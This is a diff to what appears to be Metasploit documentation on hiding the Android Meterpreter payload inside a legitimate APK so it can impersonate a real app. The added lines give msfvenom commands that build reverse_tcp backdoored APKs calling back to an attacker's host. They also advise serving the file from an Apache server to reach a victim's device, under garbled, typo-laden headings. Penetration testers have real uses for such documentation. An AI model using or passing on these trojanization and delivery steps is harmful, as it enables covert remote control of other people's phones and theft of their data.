@@ -2,12 +2,17 @@ You can inject the Android Meterpreter into an existing APK using msfvenom. This
 will allow you to impersonate an existing application, which may make it easier 
 to convince your victim to install the APK.
 
-## Vulnerable Application
+## Vulnerable An Existing Application
 
 It should be possible to inject Meterpreter into any APK, however some applications
 have complex resource structures which may not work with `apktool`.
 Additionally some applications have security measures that prevent the application
 from working as expected once it has been modified.
+
+## Create Default Metasploit Android Application
+
+It is preferred to use an existing application, however if you don't want to use existing
+application. You can Create default metasploit android application.
 
 **Finding APKs**
 
@@ -31,21 +36,34 @@ $ adb pull /data/app/com.existing.app-1/base.apk com.existing.apk
 APK Injection (as opposed to generating a single APK payload) requires a few tools
 to be present on your command line already:
 
+* [Java](https://www.oracle.com/java/technologies/downloads/) - Used for building/editing APK
 * [Apktool](https://ibotpeaches.github.io/Apktool/) - Used for rebuilding the APK
 * [keytool](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/keytool.html) - To create and extract signing certificates
 * [jarsigner](https://docs.oracle.com/javase/7/docs/technotes/tools/windows/jarsigner.html) - To re-sign the APK
 
 Installing these tools (if they are not installed already) will depend on your OS.
-Apktool can be installed manually or automatically (e.g `brew install apktool`).
+Apktool can be installed manually or automatically (e.g `brew install apktool` OR 'apt install apktool').
 keytool and jarsigner can be installed by installing the appropriate JDK.
 
-## Verification Steps
+## To Create Vulnerable apk An Existing Application
+
+Use:
 
 ```
 ./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
 ```
 
-Next, start an Android device. Upload the APK, and execute it, as you would with
+## To Create Default Metasploit Vulnerable apk
+
+```
+./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
+```
+## Sending apk to other Devices:
+
+There are many method to send APK to victim;s device but one of best method is using apache web server.
+Based on your Operating System Installation of apache is [discribed here](https://www.apachefriends.org/index.html). 
+
+Next, start an Android device. Upload the APK, execute it and run it, as you would with
 a [normal Android meterpreter APK](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/reverse_tcp.md).
 
 
